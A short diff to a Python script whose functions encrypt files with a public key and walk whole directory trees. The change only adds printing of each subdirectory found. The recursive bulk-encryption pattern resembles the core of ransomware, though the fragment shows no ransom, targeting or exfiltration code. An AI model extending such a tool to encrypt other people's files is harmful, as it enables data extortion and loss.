@@ -29,6 +29,11 @@ def encrypt_file(file_path, public_key):
 def encrypt_directory(directory, public_key):
     for root, dirs, files in os.walk(directory):
         print(f"Scanning directory: {root}")
+        
+        for dir in dirs:
+            dir_path = os.path.join(root,dir)
+            print(f"Found directories: {dir_path}")
+
         for file in files:
             file_path = os.path.join(root, file)
             print(f"Found file: {file_path}")
